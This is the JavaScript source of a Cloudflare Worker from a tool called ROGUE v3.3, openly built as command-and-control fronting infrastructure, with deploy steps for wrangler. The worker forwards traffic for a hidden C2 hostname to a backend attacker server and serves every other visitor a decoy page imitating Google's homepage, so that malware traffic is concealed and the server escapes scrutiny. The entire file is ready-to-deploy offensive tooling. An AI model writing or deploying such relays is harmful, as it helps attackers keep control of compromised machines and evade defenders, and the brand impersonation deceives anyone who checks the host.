/**
 * ROGUE v3.3 - C2 CDN Fronting Worker (Cloudflare)
 *
 * Routes on the Host header: requests for your hidden C2 hostname are
 * forwarded to the backend C2; everyone else gets a Google-like decoy page.
 * ROGUE frames pass through as opaque HTTPS POST bodies (end-to-end
 * encrypted), so the worker never sees plaintext.
 *
 * Pattern based on the churchofmalware noPROXY_c2s "c2s_cdn_fronting"
 * worker.js by ek0mssavi0r (MIT).
 *
 * Deploy:
 *   cd deploy
 *   wrangler deploy cloudflare_worker.js
 *
 * Environment (wrangler.toml or dashboard):
 *   C2_HOST      - hidden hostname that routes to the C2, e.g. "c2-api.yourdomain.com"
 *   BACKEND_URL  - actual C2 origin, e.g. "https://your-vps.example" or "http://10.0.0.5:4444"
 */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const host = (request.headers.get("Host") || "").toLowerCase();

    // ---- C2 routing ----
    if (env.C2_HOST && host === env.C2_HOST.toLowerCase()) {
      const backendUrl = env.BACKEND_URL + url.pathname + url.search;
      const backendReq = new Request(backendUrl, {
        method: request.method,
        headers: request.headers,
        body: request.body,
        redirect: "follow",
      });
      try {
        return await fetch(backendReq);
      } catch (err) {
        return new Response(
          JSON.stringify({ error: "backend unreachable", detail: err.message }),
          { status: 502, headers: { "Content-Type": "application/json" } }
        );
      }
    }

    // ---- Decoy for everything else ----
    return new Response(DECOY_HTML, {
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "public, max-age=300",
      },
    });
  },
};

const DECOY_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: #fff; color: #222;
           display: flex; flex-direction: column; align-items: center;
           min-height: 100vh; }
    .bar { width: 100%; max-width: 640px; margin: 20vh auto 0; text-align: center; }
    h1 { font-size: 64px; font-weight: 500; letter-spacing: -4px; }
    h1 span:nth-child(1){color:#4285F4} h1 span:nth-child(2){color:#EA4335}
    h1 span:nth-child(3){color:#FBBC05} h1 span:nth-child(4){color:#4285F4}
    h1 span:nth-child(5){color:#34A853} h1 span:nth-child(6){color:#EA4335}
    input { width: 100%; padding: 12px 16px; font-size: 16px; margin-top: 24px;
            border: 1px solid #dfe1e5; border-radius: 24px; outline: none; }
    input:focus { box-shadow: 0 1px 6px rgba(32,33,36,.28); border-color: transparent; }
    .btns { margin-top: 24px; }
    .btns button { background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px;
                   padding: 8px 16px; margin: 0 6px; font-size: 14px; cursor: pointer; }
    .btns button:hover { border-color: #dadce0; }
    p.foot { margin-top: 40vh; color: #70757a; font-size: 13px; }
  </style>
</head>
<body>
  <div class="bar">
    <h1><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></h1>
    <input type="text" aria-label="Search">
    <div class="btns"><button>Google Search</button><button>I'm Feeling Lucky</button></div>
  </div>
  <p class="foot">Privacy - Terms - Settings</p>
</body>
</html>`;
